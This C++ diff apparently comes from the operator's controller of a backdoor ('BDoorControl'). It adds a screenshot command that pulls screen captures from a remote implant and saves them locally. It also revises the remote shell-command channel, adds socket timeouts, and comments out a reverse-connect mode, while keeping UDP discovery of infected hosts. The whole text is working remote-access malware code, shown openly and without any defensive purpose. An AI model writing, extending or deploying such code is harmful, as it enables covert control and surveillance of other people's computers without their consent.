@@ -36,7 +36,7 @@ public:
 				char buf[1024];
 				Result = recvfrom(group_socket, buf, sizeof(buf), 0, (sockaddr*)&sender_addr, &sender_addr_size);
 				if (Result == SOCKET_ERROR) {
-					wprintf(L"recvfrom failed with error %d\n", WSAGetLastError());
+					DebugLog(string("recvfrom failed with error: ")+ to_string(WSAGetLastError()));
 				}
 				else {
 					host_list.push_back(sender_addr);
@@ -93,6 +93,7 @@ private:
 			}
 			else if (step == 1) {
 				if (command == RETURNSTR) {
+					step = 0;
 					return END;
 				}
 				string recvmess;
@@ -106,7 +107,7 @@ private:
 					return ERROR;
 				}
 				
-				returnmess = DecodeStrInBase64(json::parse(recvmess)[CONTENT]);
+				returnmess = DecodeBase64(json::parse(recvmess)[CONTENT].dump(), false);
 				return ENTRANCE;
 			}
 		}
@@ -212,11 +213,10 @@ private:
 	private:
 		const string name = "cmd";
 		SOCKET &connect_socket;
-		sockaddr_in &connect_addr;
 		int step = 0;
 
 	public:
-		Cmd(SOCKET &connect_socket_a,sockaddr_in &connect_addr_a):connect_socket(connect_socket_a),connect_addr(connect_addr_a) {
+		Cmd(SOCKET &connect_socket_a):connect_socket(connect_socket_a) {
 
 		}
 		int Func(string command, string& returnmess) {
@@ -257,59 +257,110 @@ private:
 					return ERROR;
 				}
 				else {
-					returnmess = DecodeStrInBase64(json::parse(recvmess)[CONTENT]);
+					returnmess = DecodeBase64(string(json::parse(recvmess)[CONTENT]),false);
 					return ENTRANCE;
 				}
 			}	
 		}
 		string GetName() override { return name; }
 	};
+	class ScreenShot :public Command {
+	private:
+		const string name = "screenshot";
+		SOCKET &connect_socket;
+	public:
+		ScreenShot(SOCKET& connect_socket_a) :connect_socket(connect_socket_a) {}
+		int Func(string command,string &returnmess)override {
+			vector<string> com_spl;
+			split_string(command, " ", com_spl);
+			if(com_spl[0] == "截图"||com_spl[0] == "scr"||com_spl[0] == "screenshot") {
+				if (com_spl.size() < 2) {
+					returnmess = "图像保存路径不能为空";
+					return ERROR;
+				}
+				else {
+					vector<string> filepath_spl;
+					split_string(com_spl[1], "\\", filepath_spl);
+					vector<string> filename_spl;
+					split_string(filepath_spl.back(), ".", filename_spl);
+					if (filename_spl.size() < 2) {
+						returnmess = "图像格式未知";
+						return ERROR;
+					}
+					else if (VectorFind(image_format, filepath_spl.back())) {
+						returnmess = "图像格式不支持";
+						return ERROR;
+					}
+					json sendmess = FormatJson(name);
+					sendmess[CONTENT][IMAGEFORMAT] = filename_spl.back();
+					int Result = tcp::SendBase64(connect_socket, sendmess.dump());
+					if (Result == -1) {
+						returnmess = SENDERROR;
+						return ERROR;
+					}
+					else if (Result == 0) {
+						returnmess = DISCONNECT;
+						return ERROR;
+					}
+					string recvmess;
+					Result = tcp::RecvBase64(connect_socket, recvmess);
+					if (Result <= 0) { return ERROR; }
+					DebugLog("img_data size: " + to_string(recvmess.size()));
+					//json recvjson = json::parse(recvmess);
+					ofstream ofs(com_spl[1], ios::out|ios::binary);
+					ofs.write(reinterpret_cast<const char*>(recvmess.data()), recvmess.size());
+					ofs.close();	
+					returnmess = "null";
+					return END;
+				}
+			}
+			else {
+				return NOTCOM;
+			}
+		}
+		string GetName()override { return name; }
+	};
 	const string name = "tcp";
-	SOCKET listen_socket, connect_socket;
-	sockaddr_in connect_addr,listen_addr;
+	SOCKET /*listen_socket,*/ connect_socket;
+	sockaddr_in connect_addr/*, listen_addr*/;
 	Command* entrance = nullptr;
 	int step = 0;
-	Cmd cmd = Cmd(connect_socket,connect_addr);
-	vector<Command*> command_list = { &cmd };
-	int ListenConnect() {
-		listen(listen_socket, 5);
-		int connect_addr_len = sizeof(connect_addr);
-		connect_socket = accept(listen_socket, (sockaddr*)&connect_addr,&connect_addr_len);
-		return 1;
-	}
+	Cmd cmd = Cmd(connect_socket);
+	ScreenShot screenshot = ScreenShot(connect_socket);
+	vector<Command*> command_list = { &cmd,&screenshot };
 public:
 	TCP() {
-		listen_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+		/*listen_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 		memset(&listen_addr, 0, sizeof(listen_addr));
 		listen_addr.sin_family = AF_INET;
 		listen_addr.sin_port = htons(TCP_PORT);
 		listen_addr.sin_addr.s_addr = htonl(INADDR_ANY);
-		bindport(listen_socket, (const sockaddr*)&listen_addr, sizeof(listen_addr));
+		bindport(listen_socket, (const sockaddr*)&listen_addr, sizeof(listen_addr));*/
 		connect_addr = CreateSockAddrIn(TCP_PORT);
 	}
 	~TCP() {
 		if (connect_socket != INVALID_SOCKET) {
 			closesocket(connect_socket);
 		}
-		if (connect_socket != INVALID_SOCKET) {
-			closesocket(connect_socket);
-		}
+		/*if (listen_socket != INVALID_SOCKET) {
+			closesocket(listen_socket);
+		}*/
 	}
 	int Func(string command,string &returnmess) override {
 		if (step == 0) {
 			vector <string>command_split;
 			split_string(command, " ", command_split);
-			if (command_split[0] == "reversetcp" || command_split[0] == name) {
+			if (/*command_split[0] == "reversetcp" || */command_split[0] == name) {
 				if (command_split.size() < 2) {
 					returnmess = IPEMPTY;
 					return ERROR;
 				}
 				if (check_ip(command_split[1])) {
 					connect_addr.sin_addr.s_addr = inet_addr(command_split[1].data());
-					if (command_split[0] == "reversetcp") {
+					/*if (command_split[0] == "reversetcp") {
 						step = 10;
-					}
-					else if (command_split[0] == name) {
+					}*/
+					if (command_split[0] == name) {
 						step++;
 					}
 					return ENTRANCE;
@@ -324,7 +375,7 @@ public:
 			}
 		}
 		else if (step == 1) {
-			if (command == RETURNSTR) {
+			if (command == RETURNSTR&&entrance == nullptr) {
 				step = 0;
 				return END;
 			}
@@ -332,6 +383,19 @@ public:
 			int Result;
 			connect_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 			connect(connect_socket, (const sockaddr*)&connect_addr, sizeof(connect_addr));
+
+			int Timeout = TIMEOUT;
+			//设置发送超时为1000ms
+			if (SOCKET_ERROR == setsockopt(this->connect_socket, SOL_SOCKET, SO_SNDTIMEO, (char*)&Timeout, sizeof(int)))
+			{
+				fprintf(stderr, "Set SO_SNDTIMEO error !\n");
+			}
+
+			//设置接收超时为1000ms
+			if (SOCKET_ERROR == setsockopt(this->connect_socket, SOL_SOCKET, SO_RCVTIMEO, (char*)&Timeout, sizeof(int)))
+			{
+				fprintf(stderr, "Set SO_RCVTIMEO error !\n");
+			}
 			for (int i = 0; i < command_list.size(); i++) {
 				bool is_entrance = false;
 				if (entrance != nullptr) {
@@ -344,15 +408,16 @@ public:
 				if (Result != NOTCOM) {
 					int Result2 = shutdown(connect_socket, SD_BOTH);
 					if (Result2 == SOCKET_ERROR) {
-						wprintf(L"shutdown failed with error: %d\n", WSAGetLastError());
+						DebugLog("shutdown failed with error: " + WSAGetLastError());
 						returnmess = SHUTDOWN_ERROR;
 						return ERROR;
 					}
 					if (connect_socket != INVALID_SOCKET) {
 						Result2 = closesocket(connect_socket);
 						if (Result2 == SOCKET_ERROR) {
-							wprintf(L"closesocket failed with error: %d\n", WSAGetLastError());
+							DebugLog("closesocket failed with error: " + WSAGetLastError());
 							returnmess = COLSESOCKET_ERROR;
+							return ERROR;
 						}
 					}
 					is_com = true;
@@ -378,7 +443,7 @@ public:
 				return NOTCOM;
 			}
 		}	
-
+		/*
 		if (step == 10) {
 			if (command == RETURNSTR) {
 				step = 0;
@@ -388,10 +453,20 @@ public:
 			sockaddr_in addr = CreateSockAddrIn(REVERSE_PORT);
 			bindport(reverse_socket, (const sockaddr*)&addr, sizeof(addr));
 			sockaddr_in target_addr = CreateSockAddrIn(inet_ntoa(connect_addr.sin_addr), REVERSE_PORT);
-			udp::SendtoBase64(reverse_socket, target_addr, FormatJson(name, REVERSECONNECT));
-			ListenConnect();
+			int Result = udp::SendtoBase64(reverse_socket, target_addr, FormatJson(name, REVERSECONNECT).dump());
+			if (Result == -1) {
+				DebugLog(SENDERROR);
+				return ERROR;
+			}
+			else if (Result == 0) {
+				DebugLog(DISCONNECT);
+				return ERROR;
+			}
+			listen(listen_socket, 5);
+			sockaddr_in addr1;
+			int addr1_len = sizeof(addr1);
+			connect_socket = accept(listen_socket, (sockaddr*)&addr1, &addr1_len);
 			bool is_com = false;
-			int Result;
 			for (int i = 0; i < command_list.size(); i++) {
 				bool is_entrance = false;
 				if (entrance != nullptr) {
@@ -402,6 +477,34 @@ public:
 					Result = command_list[i]->Func(command, returnmess);
 				}
 				if (Result != 0) {
+					int Result2 = shutdown(reverse_socket, SD_BOTH);
+					if (Result2 == SOCKET_ERROR) {
+						DebugLog(string("reverse_socket shutdown failed with error: ") + to_string(WSAGetLastError()));
+						returnmess = SHUTDOWN_ERROR;
+						return ERROR;
+					}
+					if (reverse_socket != INVALID_SOCKET) {
+						Result2 = closesocket(reverse_socket);
+						if (Result2 == SOCKET_ERROR) {
+							DebugLog(string("reverse_socket closesocket failed with error: ") + to_string(WSAGetLastError()));
+							returnmess = COLSESOCKET_ERROR;
+							return ERROR;
+						}
+					}
+					Result2 = shutdown(connect_socket, SD_BOTH);
+					if (Result2 == SOCKET_ERROR) {
+						DebugLog(string("connect_socket shutdown failed with error: ") + to_string(WSAGetLastError()));
+						returnmess = SHUTDOWN_ERROR;
+						//return ERROR;
+					}
+					if (connect_socket != INVALID_SOCKET) {
+						Result2 = closesocket(connect_socket);
+						if (Result2 == SOCKET_ERROR) {
+							DebugLog(string("connect_socket closesocket failed with error: ") + to_string(WSAGetLastError()));
+							returnmess = COLSESOCKET_ERROR;
+							return ERROR;
+						}
+					}
 					is_com = true;
 				}
 				switch (Result)
@@ -424,7 +527,7 @@ public:
 				returnmess = "'" + command + "'" + NOT_ANY_COMMAND;
 				return NOTCOM;
 			}
-		}
+		}*/
 	}
 	string GetEntranceName() { return entrance->GetName(); }
 	string GetName() override { return name; }
@@ -481,7 +584,7 @@ public:
 			return 0;
 		}
 	}
-	string GetEntranceName() { return entrance->GetName(); }
+	string GetEntranceName() {return entrance->GetName();}
 	~BDoorControl() {
 		WSACleanup();
 	}
